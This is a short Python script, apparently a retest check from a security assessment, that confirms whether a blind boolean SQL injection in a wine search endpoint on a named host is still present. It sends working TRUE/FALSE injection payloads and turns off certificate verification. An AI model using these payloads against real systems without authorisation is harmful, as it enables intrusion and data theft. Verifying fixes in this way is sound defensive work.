     1	#!/usr/bin/env python3
     2	"""Verify: Blind Boolean SQL Injection in GET /wines?search=.
     3	
     4	Compares the row count returned for TRUE and FALSE injected predicates.
     5	If they diverge in the expected way (TRUE→24, FALSE→0) the endpoint is
     6	still vulnerable. If both return the same count (or the server 500s
     7	on both), the vulnerability is considered fixed.
     8	
     9	Optional environment variables:
    10	    TARGET_URL          Base URL (default: https://api.taintedport.com)
    11	
    12	Usage:
    13	    python3 verify.py
    14	
    15	Exit code 0 => VULNERABLE, exit code 1 => NOT VULNERABLE (or error).
    16	"""
    17	import os, sys, requests, urllib3
    18	
    19	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    20	
    21	TARGET_URL = os.environ.get("TARGET_URL", "https://api.taintedport.com").rstrip("/")
    22	
    23	def total_for(payload):
    24	    r = requests.get(f"{TARGET_URL}/wines", params={"search": payload},
    25	                     verify=False, timeout=15)
    26	    if r.status_code != 200:
    27	        return None
    28	    try:
    29	        return r.json().get("total")
    30	    except Exception:
    31	        return None
    32	
    33	def check():
    34	    baseline = total_for("Zzz")
    35	    t_true   = total_for("Zzz%' OR (1=1) AND '%'='")
    36	    t_false  = total_for("Zzz%' OR (1=2) AND '%'='")
    37	
    38	    print(f"baseline (Zzz)                        total={baseline}")
    39	    print(f"TRUE  predicate (1=1)                 total={t_true}")
    40	    print(f"FALSE predicate (1=2)                 total={t_false}")
    41	
    42	    if (isinstance(t_true, int) and isinstance(t_false, int)
    43	            and t_true > 0 and t_false == 0 and t_true != t_false):
    44	        print(f"[VULNERABLE] Injected predicate controls result count "
    45	              f"({t_true} vs {t_false}) — blind boolean SQLi still present.")
    46	        sys.exit(0)
    47	    print("[NOT VULNERABLE] Injected boolean did not change result count.")
    48	    sys.exit(1)
    49	
    50	if __name__ == "__main__":
    51	    check()